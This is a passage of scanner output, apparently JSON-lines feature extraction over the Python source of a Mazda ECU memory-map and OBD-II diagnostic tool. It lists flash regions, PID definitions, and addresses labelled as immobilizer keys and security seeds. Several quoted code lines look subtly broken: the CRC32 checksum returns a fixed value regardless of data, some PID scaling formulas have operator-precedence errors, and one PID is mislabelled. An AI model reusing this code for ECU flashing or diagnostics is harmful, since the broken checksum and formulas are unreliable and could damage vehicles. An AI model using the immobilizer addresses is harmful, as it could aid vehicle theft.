"checksum_offset=0x17FFFC,"}, {"type": "protocol", "line": 160, "protocol": "0x[0-9A-Fa-f]+", "content": "start_address=0x180000,"}, {"type": "protocol", "line": 161, "protocol": "0x[0-9A-Fa-f]+", "content": "end_address=0x1C0000,"}, {"type": "protocol", "line": 162, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x040000,  # 256KB"}, {"type": "protocol", "line": 171, "protocol": "0x[0-9A-Fa-f]+", "content": "start_address=0x1C0000,"}, {"type": "protocol", "line": 172, "protocol": "0x[0-9A-Fa-f]+", "content": "end_address=0x1E0000,"}, {"type": "protocol", "line": 173, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x020000,  # 128KB"}, {"type": "protocol", "line": 184, "protocol": "0x[0-9A-Fa-f]+", "content": "start_address=0x1E0000,"}, {"type": "protocol", "line": 185, "protocol": "0x[0-9A-Fa-f]+", "content": "end_address=0x1F0000,"}, {"type": "protocol", "line": 186, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x010000,  # 64KB"}, {"type": "protocol", "line": 196, "protocol": "0x[0-9A-Fa-f]+", "content": "start_address=0x1F0000,"}, {"type": "protocol", "line": 197, "protocol": "0x[0-9A-Fa-f]+", "content": "end_address=0x200000,"}, {"type": "protocol", "line": 198, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x010000,  # 64KB"}, {"type": "protocol", "line": 208, "protocol": "0x[0-9A-Fa-f]+", "content": "start_address=0x200000,"}, {"type": "protocol", "line": 209, "protocol": "0x[0-9A-Fa-f]+", "content": "end_address=0x240000,"}, {"type": "protocol", "line": 210, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x040000,  # 256KB"}, {"type": "protocol", "line": 219, "protocol": "0x[0-9A-Fa-f]+", "content": "start_address=0x240000,"}, {"type": "protocol", "line": 220, "protocol": "0x[0-9A-Fa-f]+", "content": "end_address=0x280000,"}, {"type": "protocol", "line": 221, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x040000,  # 256KB"}, {"type": "protocol", "line": 231, "protocol": "0x[0-9A-Fa-f]+", "content": "FlashSector(i, i * 0x1000, 0x1000, protected=(i < 32))  # First 128KB protected"}, {"type": "protocol", "line": 240, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x020000,"}, {"type": "protocol", "line": 241, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x1000,  # 4KB"}, {"type": "protocol", "line": 252, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x021000,"}, {"type": "protocol", "line": 253, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0800,  # 2KB"}, {"type": "protocol", "line": 265, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x022000,"}, {"type": "protocol", "line": 266, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x1000,  # 4KB"}, {"type": "protocol", "line": 277, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x023000,"}, {"type": "protocol", "line": 278, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0800,  # 2KB"}, {"type": "protocol", "line": 290, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x024000,"}, {"type": "protocol", "line": 291, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0800,  # 2KB"}, {"type": "protocol", "line": 302, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x024800,"}, {"type": "protocol", "line": 303, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0800,  # 2KB"}, {"type": "protocol", "line": 315, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x025000,"}, {"type": "protocol", "line": 316, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x20,   # 32 bytes"}, {"type": "protocol", "line": 325, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x025020,"}, {"type": "protocol", "line": 326, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x20,   # 32 bytes"}, {"type": "protocol", "line": 335, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x025040,"}, {"type": "protocol", "line": 336, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x40,   # 64 bytes"}, {"type": "protocol", "line": 346, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x025080,"}, {"type": "protocol", "line": 347, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x40,   # 64 bytes"}, {"type": "protocol", "line": 356, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x0250C0,"}, {"type": "protocol", "line": 357, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x40,   # 64 bytes"}, {"type": "protocol", "line": 367, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x025100,"}, {"type": "protocol", "line": 368, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0800,  # 2KB"}, {"type": "protocol", "line": 380, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x025900,"}, {"type": "protocol", "line": 381, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x0400,  # 1KB"}, {"type": "protocol", "line": 393, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x180000,"}, {"type": "protocol", "line": 394, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x2000,  # 8KB"}, {"type": "protocol", "line": 403, "protocol": "0x[0-9A-Fa-f]+", "content": "address=0x182000,"}, {"type": "protocol", "line": 404, "protocol": "0x[0-9A-Fa-f]+", "content": "size=0x1000,  # 4KB"}, {"type": "protocol", "line": 414, "protocol": "0x[0-9A-Fa-f]+", "content": "\"VIN\": 0x1E0000,"}, {"type": "protocol", "line": 415, "protocol": "0x[0-9A-Fa-f]+", "content": "\"CALIBRATION_VERSION\": 0x1E0100,"}, {"type": "protocol", "line": 416, "protocol": "0x[0-9A-Fa-f]+", "content": "\"ECU_SERIAL\": 0x1E0200,"}, {"type": "protocol", "line": 417, "protocol": "0x[0-9A-Fa-f]+", "content": "\"IMMOBILIZER_KEY_1\": 0x1C0000,"}, {"type": "protocol", "line": 418, "protocol": "0x[0-9A-Fa-f]+", "content": "\"IMMOBILIZER_KEY_2\": 0x1C0010,"}, {"type": "protocol", "line": 419, "protocol": "0x[0-9A-Fa-f]+", "content": "\"SECURITY_SEED\": 0x1C0020,"}, {"type": "protocol", "line": 420, "protocol": "0x[0-9A-Fa-f]+", "content": "\"FLASH_CHECKSUM\": 0x17FFFC,"}, {"type": "protocol", "line": 421, "protocol": "0x[0-9A-Fa-f]+", "content": "\"BOOTLOADER_VERSION\": 0x000100,"}, {"type": "protocol", "line": 422, "protocol": "0x[0-9A-Fa-f]+", "content": "\"SOFTWARE_VERSION\": 0x1E0300,"}, {"type": "protocol", "line": 650, "protocol": "0x[0-9A-Fa-f]+", "content": "return format(struct.unpack('>I', struct.pack('>I', 0))[0] ^ 0xFFFFFFFF, '08X')"}, {"type": "protocol", "line": 740, "protocol": "0x[0-9A-Fa-f]+", "content": "\"total_flash_size\": f\"0x{len(self.FLASH_SECTORS) * 0x1000:X}\","}], "hardware_assumptions": [{"type": "hardware", "line": 2, "hardware": "ECU", "content": "MazdaMemoryMap - ECU memory addresses, calibration tables, and flash regions."}, {"type": "hardware", "line": 3, "hardware": "ECU", "content": "Centralized memory layout for 2011 Mazdaspeed 3 MZR DISI 2.3L engine ECU."}, {"type": "hardware", "line": 4, "hardware": "ECU", "content": "Includes safety checks, checksums, and validation to prevent ECU bricking."}, {"type": "hardware", "line": 15, "hardware": "ECU", "content": "from models import SecurityLevel, LogEntry"}, {"type": "hardware", "line": 19, "hardware": "ECU", "content": "\"\"\"ECU memory region types.\"\"\""}, {"type": "hardware", "line": 25, "hardware": "ECU", "content": "SECURITY = \"security\""}, {"type": "hardware", "line": 36, "hardware": "ECU", "content": "SECURITY_CRITICAL = \"security_critical\""}, {"type": "hardware", "line": 41, "hardware": "ECU", "content": "\"\"\"ECU memory range definition.\"\"\""}, {"type": "hardware", "line": 49, "hardware": "ECU", "content": "security_level: SecurityLevel = SecurityLevel.READ_ONLY"}, {"type": "hardware", "line": 81, "hardware": "ECU", "content": "\"\"\"ECU calibration table definition.\"\"\""}, {"type": "hardware", "line": 125, "hardware": "ECU", "content": "Comprehensive memory map for 2011 Mazdaspeed 3 ECU."}, {"type": "hardware", "line": 139, "hardware": "ECU", "content": "description=\"ECU bootloader and recovery code\","}, {"type": "hardware", "line": 140, "hardware": "ECU", "content": "security_level=SecurityLevel.FLASH,"}, {"type": "hardware", "line": 153, "hardware": "ECU", "content": "security_level=SecurityLevel.TUNING,"}, {"type": "hardware", "line": 166, "hardware": "ECU", "content": "security_level=SecurityLevel.DIAGNOSTIC"}, {"type": "hardware", "line": 169, "hardware": "ECU", "content": "\"SECURITY_REGION\": MemoryRange("}, {"type": "hardware", "line": 170, "hardware": "ECU", "content": "name=\"Security Region\","}, {"type": "hardware", "line": 174, "hardware": "ECU", "content": "region_type=MemoryRegion.SECURITY,"}, {"type": "hardware", "line": 175, "hardware": "ECU", "content": "access_type=AccessType.SECURITY_CRITICAL,"}, {"type": "hardware", "line": 176, "hardware": "ECU", "content": "description=\"Immobilizer keys, security seeds, and authentication data\","}, {"type": "hardware", "line": 176, "hardware": "immobilizer", "content": "description=\"Immobilizer keys, security seeds, and authentication data\","}, {"type": "hardware", "line": 177, "hardware": "ECU", "content": "security_level=SecurityLevel.ADMIN,"}, {"type": "hardware", "line": 182, "hardware": "vehicle", "content": "\"VEHICLE_SPECIFIC\": MemoryRange("}, {"type": "hardware", "line": 183, "hardware": "vehicle", "content": "name=\"Vehicle Specific Data\","}, {"type": "hardware", "line": 189, "hardware": "vehicle", "content": "description=\"VIN, configuration data, and vehicle-specific settings\","}, {"type": "hardware", "line": 190, "hardware": "ECU", "content": "security_level=SecurityLevel.ADMIN,"}, {"type": "hardware", "line": 202, "hardware": "ECU", "content": "security_level=SecurityLevel.DIAGNOSTIC"}, {"type": "hardware", "line": 214, "hardware": "ECU", "content": "security_level=SecurityLevel.DIAGNOSTIC"}, {"type": "hardware", "line": 225, "hardware": "ECU", "content": "security_level=SecurityLevel.TUNING"}, {"type": "hardware", "line": 398, "hardware": "ECU", "content": "security_level=SecurityLevel.DIAGNOSTIC"}, {"type": "hardware", "line": 408, "hardware": "ECU", "content": "security_level=SecurityLevel.DIAGNOSTIC"}, {"type": "hardware", "line": 416, "hardware": "ECU", "content": "\"ECU_SERIAL\": 0x1E0200,"}, {"type": "hardware", "line": 417, "hardware": "immobilizer", "content": "\"IMMOBILIZER_KEY_1\": 0x1C0000,"}, {"type": "hardware", "line": 418, "hardware": "immobilizer", "content": "\"IMMOBILIZER_KEY_2\": 0x1C0010,"}, {"type": "hardware", "line": 419, "hardware": "ECU", "content": "\"SECURITY_SEED\": 0x1C0020,"}, {"type": "hardware", "line": 552, "hardware": "ECU", "content": "security_level: SecurityLevel = SecurityLevel.READ_ONLY,"}, {"type": "hardware", "line": 560, "hardware": "ECU", "content": "security_level: User's security level"}, {"type": "hardware", "line": 575, "hardware": "ECU", "content": "if security_level.value < region.security_level.value:"}, {"type": "hardware", "line": 584, "hardware": "ECU", "content": "elif region.access_type == AccessType.SECURITY_CRITICAL:"}, {"type": "hardware", "line": 585, "hardware": "ECU", "content": "return security_level == SecurityLevel.ADMIN"}, {"type": "hardware", "line": 685, "hardware": "ECU", "content": "def get_safe_write_regions(self, security_level: SecurityLevel) -> List[MemoryRange]:"}, {"type": "hardware", "line": 687, "hardware": "ECU", "content": "Get regions that can be safely written with given security level."}, {"type": "hardware", "line": 690, "hardware": "ECU", "content": "security_level: User's security level"}, {"type": "hardware", "line": 698, "hardware": "ECU", "content": "if (security_level.value >= region.security_level.value and"}, {"type": "hardware", "line": 719, "hardware": "ECU", "content": "\"security_level\": region.security_level.value,"}], "security_logic": [{"type": "security_pattern", "line": 8, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 176, "pattern": "key", "content": "description=\"Immobilizer keys, security seeds, and authentication data\","}, {"type": "security_pattern", "line": 176, "pattern": "seed", "content": "description=\"Immobilizer keys, security seeds, and authentication data\","}, {"type": "security_pattern", "line": 417, "pattern": "key", "content": "\"IMMOBILIZER_KEY_1\": 0x1C0000,"}, {"type": "security_pattern", "line": 418, "pattern": "key", "content": "\"IMMOBILIZER_KEY_2\": 0x1C0010,"}, {"type": "security_pattern", "line": 419, "pattern": "seed", "content": "\"SECURITY_SEED\": 0x1C0020,"}, {"type": "security_pattern", "line": 483, "pattern": "hash", "content": "self.region_checksums[region.name] = hashlib.sha256(checksum_input.encode()).hexdigest()[:16]"}, {"type": "security_pattern", "line": 549, "pattern": "key", "content": "return sorted(sectors, key=lambda s: s.number)"}, {"type": "security_pattern", "line": 638, "pattern": "algorithm", "content": "def calculate_checksum(self, data: bytes, algorithm: str = \"crc32\") -> str:"}, {"type": "security_pattern", "line": 644, "pattern": "algorithm", "content": "algorithm: Checksum algorithm (crc32, sha256, md5)"}, {"type": "security_pattern", "line": 649, "pattern": "algorithm", "content": "if algorithm == \"crc32\":"}, {"type": "security_pattern", "line": 651, "pattern": "algorithm", "content": "elif algorithm == \"sha256\":"}, {"type": "security_pattern", "line": 652, "pattern": "hash", "content": "return hashlib.sha256(data).hexdigest()"}, {"type": "security_pattern", "line": 653, "pattern": "algorithm", "content": "elif algorithm == \"md5\":"}, {"type": "security_pattern", "line": 654, "pattern": "hash", "content": "return hashlib.md5(data).hexdigest()"}, {"type": "security_pattern", "line": 656, "pattern": "algorithm", "content": "raise ValueError(f\"Unsupported checksum algorithm: {algorithm}\")"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mazda_obd_service.py", "lines_read": 797, "features_found": [{"type": "function", "name": "parse_value", "line": 61}, {"type": "function", "name": "get_pid", "line": 257}, {"type": "function", "name": "get_all_pids", "line": 264}, {"type": "function", "name": "search_pids", "line": 271}, {"type": "function", "name": "__init__", "line": 291}, {"type": "function", "name": "set_interface", "line": 337}, {"type": "function", "name": "_build_can_message", "line": 536}, {"type": "function", "name": "_parse_can_response", "line": 546}, {"type": "function", "name": "_parse_serial_response", "line": 565}, {"type": "function", "name": "_check_security", "line": 576}, {"type": "function", "name": "get_performance_stats", "line": 779}, {"type": "function", "name": "__del__", "line": 793}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "models", "line": null}, {"type": "import", "module": "mazda_security_core", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "(", "line": null}, {"type": "import", "module": "MazdaSecurityCore", "line": null}], "components_found": [{"type": "class", "name": "OBDCommandMode", "line": 21}, {"type": "class", "name": "OBDResponseCode", "line": 35}, {"type": "class", "name": "OBDPID", "line": 48}, {"type": "class", "name": "OBDError", "line": 112}, {"type": "class", "name": "OBDTimeoutError", "line": 117}, {"type": "class", "name": "OBDProtocolError", "line": 122}, {"type": "class", "name": "MazdaPIDRegistry", "line": 127}, {"type": "class", "name": "MazdaOBDService", "line": 285}], "algorithms": [], "protocols": [{"type": "protocol", "line": 2, "protocol": "OBD", "content": "MazdaOBDService - OBD-II communication protocols for Mazda vehicles."}, {"type": "protocol", "line": 3, "protocol": "CAN", "content": "Primary focus on ISO-15765-4 (CAN) protocol with abstraction for other protocols."}, {"type": "protocol", "line": 4, "protocol": "PID", "content": "Handles standard and Mazda-specific PIDs, diagnostic services, and communication."}, {"type": "protocol", "line": 16, "protocol": "OBD", "content": "OBDProtocol, OBDPacket, TelemetryData, DiagnosticTroubleCode,"}, {"type": "protocol", "line": 21, "protocol": "OBD", "content": "class OBDCommandMode(Enum):"}, {"type": "protocol", "line": 22, "protocol": "OBD", "content": "\"\"\"OBD command modes.\"\"\""}, {"type": "protocol", "line": 35, "protocol": "OBD", "content": "class OBDResponseCode(Enum):"}, {"type": "protocol", "line": 36, "protocol": "OBD", "content": "\"\"\"OBD response codes.\"\"\""}, {"type": "protocol", "line": 37, "protocol": "0x[0-9A-Fa-f]+", "content": "POSITIVE = \"40\"  # Positive response (mode + 0x40)"}, {"type": "protocol", "line": 48, "protocol": "OBD", "content": "class OBDPID:"}, {"type": "protocol", "line": 48, "protocol": "PID", "content": "class OBDPID:"}, {"type": "protocol", "line": 49, "protocol": "OBD", "content": "\"\"\"OBD Parameter ID definition.\"\"\""}, {"type": "protocol", "line": 63, "protocol": "PID", "content": "Parse raw data according to PID formula."}, {"type": "protocol", "line": 100, "protocol": "0x[0-9A-Fa-f]+", "content": "return bool(data[0] & 0x01)"}, {"type": "protocol", "line": 112, "protocol": "OBD", "content": "class OBDError(Exception):"}, {"type": "protocol", "line": 113, "protocol": "OBD", "content": "\"\"\"OBD communication errors.\"\"\""}, {"type": "protocol", "line": 117, "protocol": "OBD", "content": "class OBDTimeoutError(OBDError):"}, {"type": "protocol", "line": 122, "protocol": "OBD", "content": "class OBDProtocolError(OBDError):"}, {"type": "protocol", "line": 127, "protocol": "PID", "content": "class MazdaPIDRegistry:"}, {"type": "protocol", "line": 128, "protocol": "PID", "content": "\"\"\"Registry of standard and Mazda-specific PIDs.\"\"\""}, {"type": "protocol", "line": 131, "protocol": "PID", "content": "STANDARD_PIDS = {"}, {"type": "protocol", "line": 132, "protocol": "OBD", "content": "\"00\": OBDPID(\"00\", \"PIDs Supported\", \"List of supported PIDs 01-20\", \"\", 0, 0xFFFFFFFF, \"A*256+B\", \""}, {"type": "protocol", "line": 132, "protocol": "0x[0-9A-Fa-f]+", "content": "\"00\": OBDPID(\"00\", \"PIDs Supported\", \"List of supported PIDs 01-20\", \"\", 0, 0xFFFFFFFF, \"A*256+B\", \""}, {"type": "protocol", "line": 132, "protocol": "PID", "content": "\"00\": OBDPID(\"00\", \"PIDs Supported\", \"List of supported PIDs 01-20\", \"\", 0, 0xFFFFFFFF, \"A*256+B\", \""}, {"type": "protocol", "line": 133, "protocol": "OBD", "content": "\"01\": OBDPID(\"01\", \"Monitor Status\", \"Since DTCs cleared\", \"\", 0, 0xFFFFFFFF, \"A*256+B\", \"int\"),"}, {"type": "protocol", "line": 133, "protocol": "0x[0-9A-Fa-f]+", "content": "\"01\": OBDPID(\"01\", \"Monitor Status\", \"Since DTCs cleared\", \"\", 0, 0xFFFFFFFF, \"A*256+B\", \"int\"),"}, {"type": "protocol", "line": 133, "protocol": "PID", "content": "\"01\": OBDPID(\"01\", \"Monitor Status\", \"Since DTCs cleared\", \"\", 0, 0xFFFFFFFF, \"A*256+B\", \"int\"),"}, {"type": "protocol", "line": 134, "protocol": "OBD", "content": "\"03\": OBDPID(\"03\", \"Fuel System Status\", \"Fuel system status\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 134, "protocol": "PID", "content": "\"03\": OBDPID(\"03\", \"Fuel System Status\", \"Fuel system status\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 135, "protocol": "OBD", "content": "\"04\": OBDPID(\"04\", \"Calculated Engine Load\", \"Engine load percentage\", \"%\", 0, 100, \"A*100/255\", \"fl"}, {"type": "protocol", "line": 135, "protocol": "PID", "content": "\"04\": OBDPID(\"04\", \"Calculated Engine Load\", \"Engine load percentage\", \"%\", 0, 100, \"A*100/255\", \"fl"}, {"type": "protocol", "line": 136, "protocol": "OBD", "content": "\"05\": OBDPID(\"05\", \"Engine Coolant Temperature\", \"Engine coolant temperature\", \"\u00b0C\", -40, 215, \"A-40"}, {"type": "protocol", "line": 136, "protocol": "PID", "content": "\"05\": OBDPID(\"05\", \"Engine Coolant Temperature\", \"Engine coolant temperature\", \"\u00b0C\", -40, 215, \"A-40"}, {"type": "protocol", "line": 137, "protocol": "OBD", "content": "\"06\": OBDPID(\"06\", \"Short Term Fuel Trim - Bank 1\", \"Short term fuel trim\", \"%\", -100, 99.2, \"A*100/"}, {"type": "protocol", "line": 137, "protocol": "PID", "content": "\"06\": OBDPID(\"06\", \"Short Term Fuel Trim - Bank 1\", \"Short term fuel trim\", \"%\", -100, 99.2, \"A*100/"}, {"type": "protocol", "line": 138, "protocol": "OBD", "content": "\"07\": OBDPID(\"07\", \"Long Term Fuel Trim - Bank 1\", \"Long term fuel trim\", \"%\", -100, 99.2, \"A*100/12"}, {"type": "protocol", "line": 138, "protocol": "PID", "content": "\"07\": OBDPID(\"07\", \"Long Term Fuel Trim - Bank 1\", \"Long term fuel trim\", \"%\", -100, 99.2, \"A*100/12"}, {"type": "protocol", "line": 139, "protocol": "OBD", "content": "\"08\": OBDPID(\"08\", \"Short Term Fuel Trim - Bank 2\", \"Short term fuel trim\", \"%\", -100, 99.2, \"A*100/"}, {"type": "protocol", "line": 139, "protocol": "PID", "content": "\"08\": OBDPID(\"08\", \"Short Term Fuel Trim - Bank 2\", \"Short term fuel trim\", \"%\", -100, 99.2, \"A*100/"}, {"type": "protocol", "line": 140, "protocol": "OBD", "content": "\"09\": OBDPID(\"09\", \"Long Term Fuel Trim - Bank 2\", \"Long term fuel trim\", \"%\", -100, 99.2, \"A*100/12"}, {"type": "protocol", "line": 140, "protocol": "PID", "content": "\"09\": OBDPID(\"09\", \"Long Term Fuel Trim - Bank 2\", \"Long term fuel trim\", \"%\", -100, 99.2, \"A*100/12"}, {"type": "protocol", "line": 141, "protocol": "OBD", "content": "\"0A\": OBDPID(\"0A\", \"Fuel Pressure\", \"Fuel pressure\", \"kPa\", 0, 765, \"A*3\", \"float\"),"}, {"type": "protocol", "line": 141, "protocol": "PID", "content": "\"0A\": OBDPID(\"0A\", \"Fuel Pressure\", \"Fuel pressure\", \"kPa\", 0, 765, \"A*3\", \"float\"),"}, {"type": "protocol", "line": 142, "protocol": "OBD", "content": "\"0B\": OBDPID(\"0B\", \"Intake Manifold Absolute Pressure\", \"MAP sensor reading\", \"kPa\", 0, 255, \"A\", \"f"}, {"type": "protocol", "line": 142, "protocol": "PID", "content": "\"0B\": OBDPID(\"0B\", \"Intake Manifold Absolute Pressure\", \"MAP sensor reading\", \"kPa\", 0, 255, \"A\", \"f"}, {"type": "protocol", "line": 143, "protocol": "OBD", "content": "\"0C\": OBDPID(\"0C\", \"Engine RPM\", \"Engine revolutions per minute\", \"RPM\", 0, 16383.75, \"A*256+B/4\", \""}, {"type": "protocol", "line": 143, "protocol": "PID", "content": "\"0C\": OBDPID(\"0C\", \"Engine RPM\", \"Engine revolutions per minute\", \"RPM\", 0, 16383.75, \"A*256+B/4\", \""}, {"type": "protocol", "line": 144, "protocol": "OBD", "content": "\"0D\": OBDPID(\"0D\", \"Vehicle Speed\", \"Vehicle speed sensor\", \"km/h\", 0, 255, \"A\", \"float\"),"}, {"type": "protocol", "line": 144, "protocol": "PID", "content": "\"0D\": OBDPID(\"0D\", \"Vehicle Speed\", \"Vehicle speed sensor\", \"km/h\", 0, 255, \"A\", \"float\"),"}, {"type": "protocol", "line": 145, "protocol": "OBD", "content": "\"0E\": OBDPID(\"0E\", \"Timing Advance\", \"Ignition timing advance\", \"\u00b0\", -64, 63.5, \"A/2-64\", \"float\"),"}, {"type": "protocol", "line": 145, "protocol": "PID", "content": "\"0E\": OBDPID(\"0E\", \"Timing Advance\", \"Ignition timing advance\", \"\u00b0\", -64, 63.5, \"A/2-64\", \"float\"),"}, {"type": "protocol", "line": 146, "protocol": "OBD", "content": "\"0F\": OBDPID(\"0F\", \"Intake Air Temperature\", \"Intake air temperature\", \"\u00b0C\", -40, 215, \"A-40\", \"floa"}, {"type": "protocol", "line": 146, "protocol": "PID", "content": "\"0F\": OBDPID(\"0F\", \"Intake Air Temperature\", \"Intake air temperature\", \"\u00b0C\", -40, 215, \"A-40\", \"floa"}, {"type": "protocol", "line": 147, "protocol": "OBD", "content": "\"10\": OBDPID(\"10\", \"MAF Air Flow Rate\", \"Mass air flow sensor\", \"g/s\", 0, 655.35, \"A*256+B/100\", \"fl"}, {"type": "protocol", "line": 147, "protocol": "PID", "content": "\"10\": OBDPID(\"10\", \"MAF Air Flow Rate\", \"Mass air flow sensor\", \"g/s\", 0, 655.35, \"A*256+B/100\", \"fl"}, {"type": "protocol", "line": 148, "protocol": "OBD", "content": "\"11\": OBDPID(\"11\", \"Throttle Position\", \"Throttle position\", \"%\", 0, 100, \"A*100/255\", \"float\"),"}, {"type": "protocol", "line": 148, "protocol": "PID", "content": "\"11\": OBDPID(\"11\", \"Throttle Position\", \"Throttle position\", \"%\", 0, 100, \"A*100/255\", \"float\"),"}, {"type": "protocol", "line": 149, "protocol": "OBD", "content": "\"13\": OBDPID(\"13\", \"O2 Sensor Present\", \"O2 sensors present\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 149, "protocol": "PID", "content": "\"13\": OBDPID(\"13\", \"O2 Sensor Present\", \"O2 sensors present\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 150, "protocol": "OBD", "content": "\"14\": OBDPID(\"14\", \"O2 Sensor 1\", \"Short term fuel trim\", \"%\", -100, 99.2, \"A*100/128-100\", \"float\")"}, {"type": "protocol", "line": 150, "protocol": "PID", "content": "\"14\": OBDPID(\"14\", \"O2 Sensor 1\", \"Short term fuel trim\", \"%\", -100, 99.2, \"A*100/128-100\", \"float\")"}, {"type": "protocol", "line": 151, "protocol": "OBD", "content": "\"15\": OBDPID(\"15\", \"O2 Sensor 2\", \"Short term fuel trim\", \"%\", -100, 99.2, \"A*100/128-100\", \"float\")"}, {"type": "protocol", "line": 151, "protocol": "PID", "content": "\"15\": OBDPID(\"15\", \"O2 Sensor 2\", \"Short term fuel trim\", \"%\", -100, 99.2, \"A*100/128-100\", \"float\")"}, {"type": "protocol", "line": 152, "protocol": "OBD", "content": "\"1C\": OBDPID(\"1C\", \"OBD Standards\", \"OBD standards this vehicle conforms to\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 152, "protocol": "PID", "content": "\"1C\": OBDPID(\"1C\", \"OBD Standards\", \"OBD standards this vehicle conforms to\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "protocol", "line": 153, "protocol": "OBD", "content": "\"1F\": OBDPID(\"1F\", \"Runtime Since Engine Start\", \"Time since engine start\", \"seconds\", 0, 65535, \"A*"}, {"type": "protocol", "line": 153, "protocol": "PID", "content": "\"1F\": OBDPID(\"1F\", \"Runtime Since Engine Start\", \"Time since engine start\", \"seconds\", 0, 65535, \"A*"}, {"type": "protocol", "line": 154, "protocol": "OBD", "content": "\"21\": OBDPID(\"21\", \"Distance Traveled with MIL On\", \"Distance with MIL on\", \"km\", 0, 65535, \"A*256+B"}, {"type": "protocol", "line": 154, "protocol": "PID", "content": "\"21\": OBDPID(\"21\", \"Distance Traveled with MIL On\", \"Distance with MIL on\", \"km\", 0, 65535, \"A*256+B"}, {"type": "protocol", "line": 155, "protocol": "OBD", "content": "\"22\": OBDPID(\"22\", \"Fuel Rail Pressure\", \"Fuel rail pressure\", \"kPa\", 0, 65535, \"A*256+B*0.079\", \"fl"}, {"type": "protocol", "line": 155, "protocol": "PID", "content": "\"22\": OBDPID(\"22\", \"Fuel Rail Pressure\", \"Fuel rail pressure\", \"kPa\", 0, 65535, \"A*256+B*0.079\", \"fl"}, {"type": "protocol", "line": 156, "protocol": "OBD", "content": "\"23\": OBDPID(\"23\", \"Fuel Rail Gauge Pressure\", \"Fuel rail gauge pressure\", \"kPa\", 0, 65535, \"A*256+B"}, {"type": "protocol", "line": 156, "protocol": "PID", "content": "\"23\": OBDPID(\"23\", \"Fuel Rail Gauge Pressure\", \"Fuel rail gauge pressure\", \"kPa\", 0, 65535, \"A*256+B"}, {"type": "protocol", "line": 157, "protocol": "OBD", "content": "\"24\": OBDPID(\"24\", \"O2 Sensor 1\", \"Air-fuel ratio\", \"\", 0, 0, \"A*256+B/32768\", \"float\"),"}, {"type": "protocol", "line": 157, "protocol": "PID", "content": "\"24\": OBDPID(\"24\", \"O2 Sensor 1\", \"Air-fuel ratio\", \"\", 0, 0, \"A*256+B/32768\", \"float\"),"}, {"type": "protocol", "line": 158, "protocol": "OBD", "content": "\"25\": OBDPID(\"25\", \"O2 Sensor 2\", \"Air-fuel ratio\", \"\", 0, 0, \"A*256+B/32768\", \"float\"),"}, {"type": "protocol", "line": 158, "protocol": "PID", "content": "\"25\": OBDPID(\"25\", \"O2 Sensor 2\", \"Air-fuel ratio\", \"\", 0, 0, \"A*256+B/32768\", \"float\"),"}, {"type": "protocol", "line": 159, "protocol": "OBD", "content": "\"2C\": OBDPID(\"2C\", \"ECU Name\", \"ECU identification\", \"\", 0, 0, \"string\", \"string\"),"}, {"type": "protocol", "line": 159, "protocol": "PID", "content": "\"2C\": OBDPID(\"2C\", \"ECU Name\", \"ECU identification\", \"\", 0, 0, \"string\", \"string\"),"}, {"type": "protocol", "line": 160, "protocol": "OBD", "content": "\"2D\": OBDPID(\"2D\", \"VIN Number\", \"Vehicle identification number\", \"\", 0, 0, \"string\", \"string\"),"}, {"type": "protocol", "line": 160, "protocol": "PID", "content": "\"2D\": OBDPID(\"2D\", \"VIN Number\", \"Vehicle identification number\", \"\", 0, 0, \"string\", \"string\"),"}, {"type": "protocol", "line": 161, "protocol": "OBD", "content": "\"2E\": OBDPID(\"2E\", \"Calibration ID\", \"ECU calibration identification\", \"\", 0, 0, \"string\", \"string\")"}, {"type": "protocol", "line": 161, "protocol": "PID", "content": "\"2E\": OBDPID(\"2E\", \"Calibration ID\", \"ECU calibration identification\", \"\", 0, 0, \"string\", \"string\")"}, {"type": "protocol", "line": 162, "protocol": "OBD", "content": "\"2F\": OBDPID(\"2F\", \"Calibration Verification\", \"Calibration verification number\", \"\", 0, 0, \"A*256+B"}, 